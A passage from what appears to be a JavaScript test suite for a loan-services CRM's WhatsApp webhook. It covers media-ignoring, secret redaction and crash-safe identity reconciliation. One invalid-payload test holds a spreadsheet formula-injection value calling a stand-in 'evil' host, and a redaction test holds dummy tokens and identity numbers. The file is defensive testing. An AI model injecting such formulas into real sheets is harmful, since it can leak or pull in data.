      makeChatMitraRequest({
        event: 'message.received',
        id: 'cm_sticker_5h35',
        from: AUTH_DIGITS,
        type: 'sticker',
        sticker: { id: 'stk_secret_01', url: 'https://cdn.chatmitra.example/secret.webp' },
        text: ''
      })
    );
    assert.equal(r.status, 200);
    await Promise.all(waitUntilPromises);

    assert.equal(forwardedWorkerBody.data.message.type, 'sticker');
    assert.equal(JSON.stringify(forwardedWorkerBody).includes('stk_secret_01'), false, 'Media ID must not be forwarded');
    assert.equal(JSON.stringify(forwardedWorkerBody).includes('secret.webp'), false, 'Media URL must not be forwarded');

    const msg = await sheets.messageEventRepository.findByProviderMessageId('cm_sticker_5h35', 'ChatMitra');
    assert.equal(msg.message_type, 'MEDIA_IGNORED');
    assert.equal(msg.delivery_status, 'MEDIA_ATTACHMENT_IGNORED');
    assert.equal((await sheets.leadRepository.findAll()).length, 0, 'Sticker must NOT create lead or text conversation');
  });

  for (const [testId, mediaType, extraPayload] of [
    ['F34-04-T05', 'image', { image: { id: 'img_1', url: 'https://cdn.example/pan.jpg' }, text: 'My PAN photo' }],
    ['F34-04-T06', 'audio', { audio: { id: 'aud_1', url: 'https://cdn.example/voice.ogg' } }],
    ['F34-04-T07', 'video', { video: { id: 'vid_1', url: 'https://cdn.example/kyc.mp4' } }],
    ['F34-04-T08', 'document', { document: { id: 'doc_1', filename: 'aadhaar.pdf' } }]
  ]) {
    it(`${testId}: ChatMitra ${mediaType} event marked MEDIA_IGNORED with zero media download, forwarding, or storage`, async () => {
      let forwarded = null;
      let axiosCalls = 0;
      axios.post = async () => {
        axiosCalls++;
        return { status: 200, data: {} };
      };
      globalThis.fetch = async (url, init) => {
        forwarded = JSON.parse(init.body);
        const w = await workerRoute.POST(new Request(url, { method: init.method, headers: init.headers, body: init.body }));
        return { ok: w.status >= 200 && w.status < 300, status: w.status, json: () => w.json() };
      };

      const msgId = `cm_${mediaType}_5h35`;
      const r = await cmWebhookRoute.POST(
        makeChatMitraRequest({
          event: 'message.received',
          id: msgId,
          from: AUTH_DIGITS,
          type: mediaType,
          ...extraPayload
        })
      );
      assert.equal(r.status, 200);
      await Promise.all(waitUntilPromises);

      assert.equal(forwarded.data.message.type, mediaType);
      assert.equal(JSON.stringify(forwarded).includes('https://cdn.example'), false);
      assert.equal(JSON.stringify(forwarded).includes('aadhaar.pdf'), false);
      assert.equal(axiosCalls, 0, 'Must never download or forward customer media');

      const row = await sheets.messageEventRepository.findByProviderMessageId(msgId, 'ChatMitra');
      assert.equal(row.message_type, 'MEDIA_IGNORED');
      assert.equal(row.delivery_status, 'MEDIA_ATTACHMENT_IGNORED');
    });
  }

  it('F34-04-T09: Unknown media types (ephemeral_reel, gif, poll) and text-smuggled mediaUrl become MEDIA_IGNORED (never text)', async () => {
    wireLocalWorkerFetch();
    for (const [idx, body] of [
      { event: 'message.received', id: 'cm_unk_1', from: AUTH_DIGITS, type: 'ephemeral_reel' },
      { event: 'message.received', id: 'cm_unk_2', from: AUTH_DIGITS, type: 'gif' },
      { event: 'message.received', id: 'cm_unk_3', from: AUTH_DIGITS, type: 'text', mediaUrl: 'https://cdn.example/secret.pdf', text: 'See doc' }
    ].entries()) {
      waitUntilPromises = [];
      const r = await cmWebhookRoute.POST(makeChatMitraRequest(body));
      assert.equal(r.status, 200, `Case ${idx} accepted for ignored-media recording`);
      await Promise.all(waitUntilPromises);
      const row = await sheets.messageEventRepository.findByProviderMessageId(body.id, 'ChatMitra');
      assert.equal(row.message_type, 'MEDIA_IGNORED', `Case ${idx} MUST be MEDIA_IGNORED, never TEXT`);
    }
  });

  it('F34-04-T10: Invalid media payloads rejected HTTP 400 INVALID_MEDIA_PAYLOAD with zero rows written', async () => {
    const invalidPayloads = [
      { event: 'message.received', id: 'cm_inv_m1', from: AUTH_DIGITS, type: 'image', image: null },
      { event: 'message.received', id: 'cm_inv_m2', from: AUTH_DIGITS, type: 'document', mediaUrl: '' },
      { event: 'message.received', id: 'cm_inv_m3', from: AUTH_DIGITS, type: 12345 },
      { event: 'message.received', id: 'cm_inv_m4', from: AUTH_DIGITS, type: '=IMPORTXML("http://evil","//a")' },
      { event: 'message.received', id: 'cm_inv_m5', from: AUTH_DIGITS, type: 'attachment', attachments: [] }
    ];
    for (const bad of invalidPayloads) {
      const r = await cmWebhookRoute.POST(makeChatMitraRequest(bad));
      assert.equal(r.status, 400, `Invalid media ${bad.id} must return HTTP 400`);
      const d = await r.json();
      assert.equal(d.success, false);
      assert.equal(d.persisted, false);
      assert.equal(d.error, 'INVALID_MEDIA_PAYLOAD');
    }
    assert.equal((await sheets.webhookEventRepository.findAll()).length, 0);
    assert.equal((await sheets.messageEventRepository.findAll()).length, 0);
  });

  it('F34-04-T11: Sensitive secrets, tokens, raw mobile, PAN, Aadhaar, and stack traces are redacted from external errors', async () => {
    const leakyText =
      'Failed calling provider with Bearer secret_tok_999 EAAGLIVE9988776655443322 api_key=sk_live_abc ' +
      'webhook_secret=whsec_999 phone +919175635165 PAN ABCDE1234F Aadhaar 2345 6789 0123\n    at POST (C:\\secret\\route.ts:99:12)';

    globalThis.fetch = async () => ({
      ok: false,
      status: 503,
      json: async () => ({ success: false, error: 'UPSTREAM_ERROR', message: leakyText })
    });

    await sheets.webhookEventRepository.registerWebhookEventIdempotent({
      event_id: 'CM_INBOUND_cm_redact_1',
      provider: 'ChatMitra',
      event_type: 'INBOUND_MESSAGE',
      rawPayloadForHashOnly: { id: 'cm_redact_1' }
    });

    const res = await cmWebhookRoute.dispatchChatMitraWorker({
      workerUrl: 'https://www.avanifinserv.com/api/whatsapp-webhook-worker',
      workerSecret: WORKER_SECRET,
      eventId: 'CM_INBOUND_cm_redact_1',
      correlationId: 'CORR-REDACT',
      workerPayload: { eventId: 'CM_INBOUND_cm_redact_1', eventType: 'INBOUND_MESSAGE', provider: 'ChatMitra', data: {} }
    });

    const outStr = JSON.stringify(res);
    assert.equal(outStr.includes('secret_tok_999'), false);
    assert.equal(outStr.includes('EAAGLIVE9988776655443322'), false);
    assert.equal(outStr.includes('sk_live_abc'), false);
    assert.equal(outStr.includes('whsec_999'), false);
    assert.equal(outStr.includes('9175635165'), false);
    assert.equal(outStr.includes('ABCDE1234F'), false);
    assert.equal(outStr.includes('2345 6789 0123'), false);
    assert.equal(outStr.includes('C:\\\\secret\\\\route.ts'), false);
  });
});

// ============================================================================
// GROUP 5 — DEFECT F34-05: DURABLE IDENTITY RECONCILIATION
// ============================================================================
describe('Group 5 — F34-05 Durable Identity Reconciliation Convergence, Starvation & Cross-Instance Lease', () => {
  let envSnap;
  beforeEach(() => {
    envSnap = snapshotEnv();
    setupMockEnv();
  });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  async function seedPendingUnresolvedEvent({
    msgId,
    webhookId,
    phone = AUTH_PHONE,
    nowMs = 1_800_000_000_000,
    provider = 'Meta'
  }) {
    const eventId = sheets.buildCanonicalMessageEventId(provider, msgId);
    const scopedUnresolved = sheets.buildScopedUnresolvedCustomerId(provider, msgId, `CORR-${msgId}`);
    await sheets.messageEventRepository.recordMessageEvent({
      event_id: eventId,
      customer_id: scopedUnresolved,
      provider,
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'DELIVERED',
      provider_message_id: msgId
    });
    if (webhookId) {
      await sheets.webhookEventRepository.registerWebhookEventIdempotent({
        event_id: webhookId,
        provider,
        event_type: 'STATUS_UPDATE',
        rawPayloadForHashOnly: { id: msgId }
      });
      await sheets.webhookEventRepository.markWebhookStatus({
        event_id: webhookId,
        processing_status: 'FAILED',
        error_code: 'CUSTOMER_IDENTITY_UNRESOLVED'
      });
    }
    const checkpoint = await sheets.stagePendingIdentityReconciliation({
      messageEventId: eventId,
      provider,
      providerMessageId: msgId,
      fromPhone: phone,
      eventType: 'STATUS_UPDATE',
      webhookEventId: webhookId,
      correlationId: `CORR-${msgId}`,
      nowMs
    });
    return { eventId, checkpoint };
  }

  it('F34-05-T01: Crash BEFORE MESSAGE_EVENTS update recovers cleanly on next run across all 3 layers', async () => {
    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-R05-01',
      customer_name: 'Recovery User 1',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await seedPendingUnresolvedEvent({ msgId: 'wamid.cr_before_msg', webhookId: 'META_ST_CR_01', nowMs: t0 });

    // Crash inside beforeCommitHook before MESSAGE_EVENTS update
    const failedRun = await sheets.reconcilePendingMessageIdentities({
      nowMs: t0 + 1000,
      beforeCommitHook: async () => {
        throw new Error('SIMULATED_CRASH_BEFORE_MSG_UPDATE');
      }
    });
    assert.equal(failedRun.errors, 1);
    assert.equal(failedRun.reconciled, 0);
    assert.equal((await sheets.webhookEventRepository.findById('META_ST_CR_01')).processing_status, 'FAILED');

    // Next run converges all 3 layers cleanly
    const okRun = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 2000 });
    assert.equal(okRun.reconciled, 1);
    assert.equal(okRun.outboundResent, 0);
    assert.equal((await sheets.messageEventRepository.findByProviderMessageId('wamid.cr_before_msg', 'Meta')).customer_id, 'CUST-R05-01');
    assert.equal((await sheets.webhookEventRepository.findById('META_ST_CR_01')).processing_status, 'COMPLETED');
  });

  it('F34-05-T02: Crash AFTER MESSAGE_EVENTS update converges linked WEBHOOK_EVENTS & checkpoint (ADV-5H34-R05-01 subcase A replay)', async () => {
    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-R05-02',
      customer_name: 'Recovery User 2',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await sheets.messageEventRepository.recordMessageEvent({
      event_id: 'MSG_META_wamid.cr_after_msg',
      customer_id: 'CUST-R05-02',
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'DELIVERED',
      provider_message_id: 'wamid.cr_after_msg'
    });
    await sheets.webhookEventRepository.registerWebhookEventIdempotent({
      event_id: 'META_ST_CR_02',
      provider: 'Meta',
      event_type: 'STATUS_UPDATE',
      rawPayloadForHashOnly: { id: 'wamid.cr_after_msg' }
    });
    await sheets.webhookEventRepository.markWebhookStatus({
      event_id: 'META_ST_CR_02',
      processing_status: 'FAILED',
      error_code: 'CUSTOMER_IDENTITY_UNRESOLVED'
    });
    await sheets.stagePendingIdentityReconciliation({
      messageEventId: 'MSG_META_wamid.cr_after_msg',
      provider: 'Meta',
      providerMessageId: 'wamid.cr_after_msg',
      fromPhone: AUTH_PHONE,
      eventType: 'STATUS_UPDATE',
      webhookEventId: 'META_ST_CR_02',
      nowMs: t0
    });

    const run = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    assert.equal(run.reconciled, 1);
    assert.equal((await sheets.messageEventRepository.findAll()).length, 1);
    const wh = await sheets.webhookEventRepository.findById('META_ST_CR_02');
    assert.equal(wh.processing_status, 'COMPLETED', 'Linked webhook MUST converge from FAILED to COMPLETED');
  });

  it('F34-05-T03 & T07: Crash BEFORE / FAILURE during WEBHOOK_EVENTS update does NOT mark checkpoint RECONCILED; next run converges', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-wh-fail/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;

    let failWebhookUpdate = false;
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (failWebhookUpdate && cmd.tab === 'WEBHOOK_EVENTS' && cmd.action === 'UPSERT_ROW') {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: false, status: 503, code: 'GOOGLE_SHEETS_UNAVAILABLE', error: 'Webhook write drop' })
        };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-R05-WHF',
      customer_name: 'Webhook Fail User',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    const { checkpoint } = await seedPendingUnresolvedEvent({
      msgId: 'wamid.wh_fail_1',
      webhookId: 'META_ST_WHF_01',
      nowMs: t0
    });

    // Inject failure specifically during WEBHOOK_EVENTS update
    failWebhookUpdate = true;
    const runFail = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    assert.equal(runFail.errors, 1);
    assert.equal(runFail.reconciled, 0);

    // Checkpoint MUST NOT conceal FAILED webhook by claiming RECONCILED!
    const cpRowAfterFail = await sheets.systemConfigRepository.findById(checkpoint.configKey);
    assert.notEqual(JSON.parse(cpRowAfterFail.config_value).st, 'D', 'Checkpoint MUST NOT be marked RECONCILED while webhook is FAILED');
    assert.equal((await sheets.webhookEventRepository.findById('META_ST_WHF_01')).processing_status, 'FAILED');

    // Recover and re-run -> converges WEBHOOK_EVENTS to COMPLETED and checkpoint to RECONCILED!
    failWebhookUpdate = false;
    const runOk = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 2000 });
    assert.equal(runOk.reconciled, 1);
    assert.equal((await sheets.webhookEventRepository.findById('META_ST_WHF_01')).processing_status, 'COMPLETED');
    const cpRowAfterOk = await sheets.systemConfigRepository.findById(checkpoint.configKey);
    assert.equal(JSON.parse(cpRowAfterOk.config_value).st, 'D');
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 2, 'Zero duplicate MESSAGE_EVENTS');
  });

  it('F34-05-T04, T05 & T06: Crash AFTER WEBHOOK_EVENTS update / Checkpoint update failure converges cleanly on next run', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-cp-fail/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;

    let failCheckpointUpsert = false;
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (failCheckpointUpsert && cmd.tab === 'SYSTEM_CONFIG' && cmd.action === 'UPSERT_ROW') {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: false, status: 503, code: 'GOOGLE_SHEETS_UNAVAILABLE', error: 'Checkpoint write drop' })
        };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-R05-CPF',
      customer_name: 'Checkpoint Fail User',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    const { checkpoint } = await seedPendingUnresolvedEvent({
      msgId: 'wamid.cp_fail_1',
      webhookId: 'META_ST_CPF_01',
      nowMs: t0
    });

    // Crash right before checkpoint update (MESSAGE_EVENTS + WEBHOOK_EVENTS already succeeded!)
    failCheckpointUpsert = true;
    const run1 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    assert.equal(run1.errors, 1);
    assert.equal((await sheets.messageEventRepository.findByProviderMessageId('wamid.cp_fail_1', 'Meta')).customer_id, 'CUST-R05-CPF');
    assert.equal((await sheets.webhookEventRepository.findById('META_ST_CPF_01')).processing_status, 'COMPLETED');

    // Recover checkpoint write -> next run converges checkpoint cleanly with zero duplicates
    failCheckpointUpsert = false;
    const run2 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 2000 });
    assert.equal(run2.reconciled, 1);
    assert.equal(run2.outboundResent, 0);
    const cpFinal = await sheets.systemConfigRepository.findById(checkpoint.configKey);
    assert.equal(JSON.parse(cpFinal.config_value).st, 'D');
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 2);
  });

  it('F34-05-T08: Due event after 10 non-due entries is reconciled immediately under batchLimit=1 (zero starvation)', async () => {
    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-DUE-STARVE',
      customer_name: 'Due User',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });

    // Stage 10 future non-due entries FIRST
    for (let i = 1; i <= 10; i++) {
      await seedPendingUnresolvedEvent({
        msgId: `wamid.future_${i}`,
        phone: `+9198000010${String(i).padStart(2, '0')}`,
        nowMs: t0 + 500_000 + i * 1000
      });
    }
    // Stage 1 due entry LAST
    await seedPendingUnresolvedEvent({
      msgId: 'wamid.due_last',
      webhookId: 'META_ST_DUE_LAST',
      phone: AUTH_PHONE,
      nowMs: t0
    });

    const run = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 10_000, batchLimit: 1 });
    assert.equal(run.skippedNotDue, 10);
    assert.equal(run.scanned, 1);
    assert.equal(run.reconciled, 1, 'Due event MUST NOT be starved by preceding non-due entries');
    assert.equal((await sheets.messageEventRepository.findByProviderMessageId('wamid.due_last', 'Meta')).customer_id, 'CUST-DUE-STARVE');
  });

  it('F34-05-T09: Batch limit smaller than pending due queue processes deterministically across batches', async () => {
    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-BATCH-5',
      customer_name: 'Batch User',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    for (let i = 1; i <= 5; i++) {
      await seedPendingUnresolvedEvent({ msgId: `wamid.batch_${i}`, phone: AUTH_PHONE, nowMs: t0 + i * 1000 });
    }

    const r1 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 60_000, batchLimit: 2 });
    const r2 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 61_000, batchLimit: 2 });
    const r3 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 62_000, batchLimit: 2 });
    const r4 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 63_000, batchLimit: 2 });

    assert.equal(r1.reconciled, 2);
    assert.equal(r2.reconciled, 2);
    assert.equal(r3.reconciled, 1);
    assert.equal(r4.scanned, 0);
    const allMsgs = await sheets.messageEventRepository.findAll();
    assert.equal(allMsgs.length, 5);
    assert.ok(allMsgs.every((m) => m.customer_id === 'CUST-BATCH-5'));
  });

  it('F34-05-T10: Two truly independent reconciliation workers are coordinated via durable SYSTEM_CONFIG RECON_LEASE on gateway.gs VM', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-two-recon/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;
    globalThis.fetch = vmHarness.gatewayFetch;

    const inst1 = loadIsolatedAppInstance();
    const inst2 = loadIsolatedAppInstance();
    assert.notEqual(inst1.sheets.reconcilePendingMessageIdentities, inst2.sheets.reconcilePendingMessageIdentities);

    const t0 = 1_800_000_000_000;
    await inst1.sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-DIST-RECON',
      customer_name: 'Dist Recon User',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await inst1.sheets.messageEventRepository.recordMessageEvent({
      event_id: 'MSG_META_wamid.dist_recon_1',
      customer_id: inst1.sheets.buildScopedUnresolvedCustomerId('Meta', 'wamid.dist_recon_1', 'C1'),
      provider: 'Meta',
      message_type: 'TEXT',
      direction: 'outbound',
      delivery_status: 'DELIVERED',
      provider_message_id: 'wamid.dist_recon_1'
    });
    await inst1.sheets.stagePendingIdentityReconciliation({
      messageEventId: 'MSG_META_wamid.dist_recon_1',
      provider: 'Meta',
      providerMessageId: 'wamid.dist_recon_1',
      fromPhone: AUTH_PHONE,
      eventType: 'STATUS_UPDATE',
      nowMs: t0
    });

    let releaseInst1;
    const holdInst1 = new Promise((r) => {
      releaseInst1 = r;
    });
    let inst1EnteredHook;
    const hookReady = new Promise((r) => {
      inst1EnteredHook = r;
    });

    const p1 = inst1.sheets.reconcilePendingMessageIdentities({
      nowMs: t0 + 1000,
      workerId: 'worker-instance-A',
      leaseTtlSec: 60,
      beforeCommitHook: async () => {
        inst1EnteredHook();
        await holdInst1;
      }
    });
    await hookReady;

    // Independent Worker Instance B runs while Instance A holds durable SYSTEM_CONFIG lease
    const res2 = await inst2.sheets.reconcilePendingMessageIdentities({
      nowMs: t0 + 2000,
      workerId: 'worker-instance-B',
      leaseTtlSec: 60
    });
    releaseInst1();
    const res1 = await p1;

    assert.equal(res1.reconciled, 1);
    assert.equal(res2.skippedInFlight, 1, 'Independent worker instance MUST respect durable RECON_LEASE in SYSTEM_CONFIG');
    assert.equal(res2.reconciled, 0);
    assert.equal(vmHarness.sheetsMap.get('MESSAGE_EVENTS').length, 2, 'Zero duplicate MESSAGE_EVENTS');
    // Lease must be cleaned up in SYSTEM_CONFIG after completion
    const leaseRowsAfter = vmHarness.sheetsMap.get('SYSTEM_CONFIG').filter((r) => String(r[0]).startsWith('RECON_LEASE_'));
    assert.equal(leaseRowsAfter.length, 0, 'Durable lease must be released cleanly in finally');
  });

  it('F34-05-T11: Restart after incomplete reconciliation (stale lease left by crashed worker) reclaims lease after TTL and converges', async () => {
    const t0 = 1_800_000_000_000;
    const t0Sec = Math.floor(t0 / 1000);
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-STALE-LEASE',
      customer_name: 'Stale Lease User',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    const { checkpoint } = await seedPendingUnresolvedEvent({
      msgId: 'wamid.stale_lease_1',
      webhookId: 'META_ST_STALE_1',
      nowMs: t0
    });

    // Simulate a crashed process that left an unreleased lease expiring at t0Sec + 60
    const leaseKey = sheets.buildReconciliationLeaseKey(checkpoint.eventIdHash);
    await sheets.systemConfigRepository.upsert({
      config_key: leaseKey,
      config_value: JSON.stringify({ o: 'crashed-worker-99', exp: t0Sec + 60 }),
      updated_at: new Date(t0).toISOString()
    });

    // Before TTL expires -> skippedInFlight
    const earlyRun = await sheets.reconcilePendingMessageIdentities({
      nowMs: t0 + 30_000,
      workerId: 'fresh-worker-1'
    });
    assert.equal(earlyRun.skippedInFlight, 1);
    assert.equal(earlyRun.reconciled, 0);

    // After TTL expires -> stale lease reclaimed and all 3 layers converged
    const recoverRun = await sheets.reconcilePendingMessageIdentities({
      nowMs: t0 + 65_000,
      workerId: 'fresh-worker-2'
    });
    assert.equal(recoverRun.reconciled, 1);
    assert.equal((await sheets.messageEventRepository.findByProviderMessageId('wamid.stale_lease_1', 'Meta')).customer_id, 'CUST-STALE-LEASE');
    assert.equal((await sheets.webhookEventRepository.findById('META_ST_STALE_1')).processing_status, 'COMPLETED');
  });

  it('F34-05-T12: Repeated reconciliation of an already-reconciled event is a strict no-op', async () => {
    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-IDEMP-R',
      customer_name: 'Idem Recon',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await seedPendingUnresolvedEvent({ msgId: 'wamid.idem_r_1', webhookId: 'META_ST_IDEM_1', nowMs: t0 });

    const r1 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    const r2 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 2000 });
    const r3 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 500_000 });

    assert.equal(r1.reconciled, 1);
    assert.equal(r2.scanned, 0);
    assert.equal(r2.reconciled, 0);
    assert.equal(r3.scanned, 0);
    assert.equal(r3.outboundResent, 0);
    assert.equal((await sheets.messageEventRepository.findAll()).length, 1);
  });

  it('F34-05-T13: Retry-limit exhaustion transitions to terminal EXHAUSTED with bounded exponential backoff + jitter', async () => {
    const d1 = sheets.computeReconciliationBackoffMs(1, { baseDelayMs: 1000, maxDelayMs: 10_000, jitterRatio: 0.2, randomFn: () => 0.5 });
    const d2 = sheets.computeReconciliationBackoffMs(2, { baseDelayMs: 1000, maxDelayMs: 10_000, jitterRatio: 0.2, randomFn: () => 0.5 });
    const d10 = sheets.computeReconciliationBackoffMs(10, { baseDelayMs: 1000, maxDelayMs: 10_000, jitterRatio: 0.2, randomFn: () => 1.0 });
    assert.equal(d1, 1100);
    assert.equal(d2, 2200);
    assert.equal(d10, 10_000, 'Backoff must remain bounded by maxDelayMs');

    const t0 = 1_800_000_000_000;
    await seedPendingUnresolvedEvent({ msgId: 'wamid.exh_5h35', webhookId: 'META_ST_EXH_1', phone: '+919899001122', nowMs: t0 });

    const r1 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000, baseDelayMs: 5000, jitterRatio: 0, maxAttempts: 3 });
    const r2 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 10_000, baseDelayMs: 5000, jitterRatio: 0, maxAttempts: 3 });
    const r3 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 30_000, baseDelayMs: 5000, jitterRatio: 0, maxAttempts: 3 });
    const r4 = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 999_000, baseDelayMs: 5000, jitterRatio: 0, maxAttempts: 3 });

    assert.equal(r1.retrying, 1);
    assert.equal(r2.retrying, 1);
    assert.equal(r3.exhausted, 1);
    assert.equal(r4.scanned, 0, 'Terminal EXHAUSTED entry must not retry infinitely');
    const wh = await sheets.webhookEventRepository.findById('META_ST_EXH_1');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'RECONCILIATION_EXHAUSTED');
  });

  it('F34-05-T14: Malformed checkpoint JSON in SYSTEM_CONFIG is safely isolated without crashing valid entries', async () => {
    const t0 = 1_800_000_000_000;
    await sheets.customerRepository.upsertCustomer({
      customer_id: 'CUST-VALID-SIBLING',
      customer_name: 'Valid Sibling',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    // Inject corrupt checkpoint rows matching RECON_<16hex>
    await sheets.systemConfigRepository.upsert({
      config_key: 'RECON_deadbeef01234567',
      config_value: '{CORRUPTED_JSON',
      updated_at: new Date(t0).toISOString()
    });
    await sheets.systemConfigRepository.upsert({
      config_key: 'RECON_abcdef0123456789',
      config_value: JSON.stringify({ p: 'UnknownProv', st: 'P', fs: 1, a: 0, nr: 1 }),
      updated_at: new Date(t0).toISOString()
    });
    await seedPendingUnresolvedEvent({ msgId: 'wamid.valid_sibling_1', phone: AUTH_PHONE, nowMs: t0 });

    const run = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    assert.equal(run.malformedSkipped, 2);
    assert.equal(run.errors, 2);
    assert.equal(run.reconciled, 1, 'Valid due checkpoint MUST still reconcile cleanly');
    const diag = await sheets.getReconciliationDiagnostics();
    assert.equal(diag.malformed, 2);
    assert.equal(diag.reconciled, 1);
  });

  it('F34-05-T15: Zero SYSTEM_CONFIG collisions with unrelated keys, zero raw phone PII stored, and hash never bypasses ownership', async () => {
    const t0 = 1_800_000_000_000;
    // Seed unrelated custom SYSTEM_CONFIG key with similar prefix
    await sheets.systemConfigRepository.setConfigValue('RECON_FEATURE_FLAG', 'DISABLED_LOCAL');
    await seedPendingUnresolvedEvent({ msgId: 'wamid.pii_check_1', phone: AUTH_PHONE, nowMs: t0 });

    // Confirm zero raw mobile numbers anywhere in SYSTEM_CONFIG
    const allConfig = await sheets.systemConfigRepository.findAll();
    const configDump = JSON.stringify(allConfig);
    assert.equal(configDump.includes('9175635165'), false, 'SYSTEM_CONFIG MUST NEVER store raw customer phone');

    // Run reconciliation -> unrelated keys preserved completely untouched
    await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 1000 });
    assert.equal((await sheets.systemConfigRepository.findById('spreadsheet_name')).config_value, 'AVANI_LOAN_SERVICES_CRM_MASTER');
    assert.equal((await sheets.systemConfigRepository.findById('RECON_FEATURE_FLAG')).config_value, 'DISABLED_LOCAL');

    // Hash collision / duplicate customer safety: two distinct CUSTOMERS rows sharing same phone -> fails closed (never guesses)
    await sheets.customerRepository.upsert({
      customer_id: 'CUST-COLLIDE-A',
      customer_name: 'Owner A',
      mobile_number: AUTH_PHONE,
      city: 'Latur',
      enquiry_source: 'WEBSITE',
      created_at: new Date(t0).toISOString(),
      updated_at: new Date(t0).toISOString(),
      record_status: 'ACTIVE'
    });
    await sheets.customerRepository.upsert({
      customer_id: 'CUST-COLLIDE-B',
      customer_name: 'Owner B',
      mobile_number: AUTH_PHONE,
      city: 'Pune',
      enquiry_source: 'WEBSITE',
      created_at: new Date(t0).toISOString(),
      updated_at: new Date(t0).toISOString(),
      record_status: 'ACTIVE'
    });

    const ambigRun = await sheets.reconcilePendingMessageIdentities({ nowMs: t0 + 100_000 });
    assert.equal(ambigRun.reconciled, 0, 'Ambiguous phoneHash collision MUST fail closed, never guess customer');
    assert.equal(ambigRun.retrying, 1);
  });
});

// ============================================================================
// GROUP 6 — CROSS-PROVIDER OPT-OUT, FORMULA INJECTION & ZERO DB FALLBACK
// ============================================================================
describe('Group 6 — Cross-Provider Safeguards, Hindi/Marathi Opt-Out, Formula Injection & DB Isolation', () => {
  let envSnap;
  beforeEach(() => {
    envSnap = snapshotEnv();
    setupMockEnv();
  });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
